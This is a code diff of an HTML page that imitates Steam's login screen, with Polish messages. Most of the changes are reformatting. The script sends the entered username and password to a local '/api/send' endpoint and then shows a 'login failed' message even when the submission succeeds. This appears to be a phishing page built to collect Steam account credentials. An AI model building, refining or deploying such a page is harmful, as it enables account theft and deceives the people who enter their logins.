@@ -3,7 +3,6 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
     <title>STEAM</title>
 
     <style>
@@ -20,7 +19,6 @@
 
         body {
             min-height: 100vh;
-
             display: flex;
             align-items: center;
             justify-content: center;
@@ -44,14 +42,12 @@
         .panel {
             width: 765px;
             min-height: 340px;
-
             background: #171a21;
 
             box-shadow:
                 0 20px 60px rgba(0, 0, 0, 0.55);
 
             border-radius: 3px;
-
             overflow: hidden;
         }
 
@@ -65,9 +61,7 @@
 
             font-size: 42px;
             font-weight: 700;
-
             color: #ffffff;
-
             letter-spacing: 0.5px;
         }
 
@@ -77,11 +71,9 @@
 
         .field label {
             display: block;
-
             margin-bottom: 8px;
 
             color: #d6d7d8;
-
             font-size: 14px;
             font-weight: 600;
         }
@@ -89,18 +81,14 @@
         .field input {
             width: 100%;
             height: 39px;
-
             padding: 0 12px;
 
             border: 1px solid #323843;
             border-radius: 2px;
-
             outline: none;
 
             background: #323640;
-
             color: white;
-
             font-size: 15px;
 
             transition: 0.15s;
@@ -130,20 +118,16 @@
             margin-top: 2px;
 
             color: #b8b9bd;
-
             font-size: 13px;
-
             cursor: pointer;
         }
 
         .remember input {
             width: 18px;
             height: 18px;
-
             margin: 0 7px 0 0;
 
             accent-color: #66c0f4;
-
             cursor: pointer;
         }
 
@@ -152,7 +136,6 @@
             height: 45px;
 
             display: block;
-
             margin: 19px auto 0;
 
             border: 0;
@@ -199,13 +182,11 @@
 
         #status {
             min-height: 18px;
-
             margin-top: 12px;
 
             text-align: center;
 
             color: #8f98a5;
-
             font-size: 13px;
         }
 
@@ -292,15 +273,15 @@
 
     </div>
 
-
     <script>
         const form = document.getElementById("form");
         const pole1 = document.getElementById("pole1");
         const pole2 = document.getElementById("pole2");
         const status = document.getElementById("status");
-        const submitButton = document.getElementById("submitButton");
+        const submitButton =
+            document.getElementById("submitButton");
 
-        form.addEventListener("submit", async function(event) {
+        form.addEventListener("submit", async (event) => {
 
             event.preventDefault();
 
@@ -308,8 +289,12 @@
             const value2 = pole2.value.trim();
 
             if (!value1 || !value2) {
-                status.textContent = "Uzupełnij oba pola.";
-                status.style.color = "#d66b6b";
+                status.textContent =
+                    "Uzupełnij oba pola.";
+
+                status.style.color =
+                    "#d66b6b";
+
                 return;
             }
 
@@ -319,31 +304,39 @@
             status.style.color = "#8f98a5";
 
             try {
-                const response = await fetch("/api/send", {
-                    method: "POST",
 
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
+                const response = await fetch(
+                    "/api/send",
+                    {
+                        method: "POST",
 
-                    body: JSON.stringify({
-                        pole1: value1,
-                        pole2: value2
-                    })
-                });
+                        headers: {
+                            "Content-Type":
+                                "application/json"
+                        },
 
-                const result = await response.json();
+                        body: JSON.stringify({
+                            pole1: value1,
+                            pole2: value2
+                        })
+                    }
+                );
+
+                const result =
+                    await response.json();
 
                 if (!response.ok) {
                     throw new Error(
-                        result.error || "Błąd serwera."
+                        result.error ||
+                        "Błąd serwera."
                     );
                 }
 
                 status.textContent =
-                    "Nieprawidłowe hasło lub nazwa użytkownika";
+                    "Błąd";
 
-                status.style.color = "#66c0f4";
+                status.style.color =
+                    "#66c0f4";
 
                 pole1.value = "";
                 pole2.value = "";
@@ -353,11 +346,13 @@
                 console.error(error);
 
                 status.textContent =
-                    "Nieprawidłowe hasło lub nazwa użytkownika";
+                    "Nie udało się zalogować.";
 
-                status.style.color = "#d66b6b";
+                status.style.color =
+                    "#d66b6b";
 
             } finally {
+
                 submitButton.disabled = false;
             }
         });
